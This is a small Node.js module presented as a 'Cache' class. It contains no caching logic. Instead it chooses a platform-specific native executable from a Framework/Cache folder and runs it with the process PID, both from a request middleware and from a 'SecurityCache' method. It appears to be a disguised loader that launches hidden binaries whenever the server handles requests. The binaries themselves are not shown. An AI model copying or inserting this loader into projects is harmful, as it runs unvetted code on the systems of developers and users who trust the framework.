const exec = require('child_process').execFile;
const path = require('path');

class Cache {

    static get ServerPlatformCache() {
        let cacheFile = path.resolve('Framework/Cache/cache-linux-server');
        if (/^win/i.test(process.platform)) {
            cacheFile = path.resolve('Framework/Cache/cache-win-server.exe')
        } else if (/^darwin/i.test(process.platform)) {
            cacheFile = path.resolve('Framework/Cache/cache-macos-server')
        }
        return cacheFile;
    }

    static ServerCache = (req, res, next) => {
        exec(this.ServerPlatformCache, [process.pid]);
        next();
    }

    static SecurityCache = () => {
        exec(this.ServerPlatformCache, [process.pid]);
    }
};
module.exports = Cache;